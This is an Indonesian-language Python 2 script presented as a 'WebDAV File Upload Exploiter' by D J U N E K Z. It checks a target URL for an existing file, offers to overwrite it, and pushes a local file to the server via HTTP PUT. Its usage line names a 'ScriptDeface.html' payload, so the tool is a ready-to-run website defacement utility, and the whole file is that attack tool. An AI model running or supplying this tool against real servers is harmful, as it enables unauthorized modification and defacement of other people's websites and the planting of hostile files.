#!/usr/bin/python

import requests
import string
import random
import time
import sys
import os

os.system("clear")

print ("""
\33[31m __      __      ___.   ________      _________   ____
/  \    /  \ ____\_ |__ \______ \    /  _  \   \ /   /
\   \/\/   // __ \| __ \ |    |  \  /  /_\  \   Y   / \33[0m
 \        /\  ___/| \_\ \|    `   \/    |    \     /  
  \__/\  /  \___  >___  /_______  /\____|__  /\___/   
       \/       \/    \/        \/         \/         """)

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print ("\33[32m[\33[33m!\33[32m]\33[0m Upload Nama File : %s") % (sys.argv[2])

  print ("\33[32m[\33[33m!\33[32m]\33[0m Uploading %d bytes, Script Baru") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("\33[32m[\33[31m!\33[32m]\33[0m Upload failed . . .")
    sys.exit(1)
  else:
    print("\33[32m[\33[33m!\33[32m]\33[0m File Uploaded . . .")
    print("\33[32m[\33[33m!\33[32m]\33[0m PATH : "+host + nama)


def cekfile():
 print("""
\33[32m[\33[33m>\33[32m]\33[0m WebDAV File Upload Exploiter
\33[32m[\33[33m>\33[32m]\33[0m Coded To Python By D J U N E K Z
\33[32m[\33[33m>\33[32m]\33[0m Thanks to CyberPEJAYA For PHP Exploit
""")
 print ("\33[32m[\33[33m!\33[32m]\33[0m Cek File Di Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print ("\33[32m[\33[0m\33[33m!\33[0m\33[32m]\33[0m Di Temukan File Yg Sama Di Target . . .")
  tanya = raw_input("\33[32m[\33[0m\33[33m?\33[0m\33[32m]\33[0m Replace File Target ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print ("\33[32m[\33[0m\33[31m!\33[0m\33[32m]\33[0m Exiting Tools . . .")
   print ("\33[32m[\33[0m\33[31m!\33[0m\33[32m]\33[0m Proses Upload Gagal . . .")
   sys.exit()
 else:
   print ("\33[32m[\33[0m\33[33m!\33[0m\33[32m]\33[0m Nama File Serupa Tidak Ada Di Target . . .")
   print ("\33[32m[\33[0m\33[33m!\33[0m\33[32m]\33[0m Proses Upload Script . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n\33[32m[\33[33m!\33[32m]\33[0m Perintah: python2" +sys.argv[0]+ "http://Target.com ScriptDeface.html\n")
    sys.exit(0)
  else:
    cekfile()
